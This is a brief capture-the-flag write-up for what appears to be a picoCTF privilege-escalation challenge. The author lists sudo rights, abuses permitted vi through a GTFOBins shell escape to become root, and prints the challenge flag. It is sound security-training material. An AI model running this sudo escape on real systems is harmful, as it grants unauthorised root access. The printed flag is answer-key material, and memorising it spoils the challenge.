We need to first see what commands can be used by doing sudo -l
```bash
 ssh picoctf@saturn.picoctf.net -p 52082             
The authenticity of host '[saturn.picoctf.net]:52082 ([13.59.203.175]:52082)' can't be established.
ED25519 key fingerprint is SHA256:lAxuAwDPxkngr5Aw0vqCbwmNz/+0ii8HjltkWeRcMjw.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:7: [hashed name]
    ~/.ssh/known_hosts:8: [hashed name]
    ~/.ssh/known_hosts:9: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[saturn.picoctf.net]:52082' (ED25519) to the list of known hosts.
picoctf@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.19.0-1024-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

picoctf@challenge:~$ sudo -l
Matching Defaults entries for picoctf on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoctf may run the following commands on challenge:
    (ALL) /usr/bin/vi
    (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py

```

We see that only server.py is available and /usr/bin/vi
Since server.py has nothing, we have to focus on the latter
[https://gtfobins.github.io/gtfobins/vi/](https://gtfobins.github.io/gtfobins/vi/)
Using gtfobins,

```bash
$ sudo vi -c ':!/bin/sh' /dev/null
[sudo] password for picoctf: 

# whoami
root
# cd /root
# ls -al
total 12
drwx------ 1 root root   23 Aug  4 21:11 .
drwxr-xr-x 1 root root   51 Jan 11 09:34 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   43 Aug  4 21:11 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
# cat .flag.txt
picoCTF{pYth0nn_libraryH!j@CK!n9_566dbbb7}
```

**FLAG - `picoCTF{pYth0nn_libraryH!j@CK!n9_566dbbb7}`**


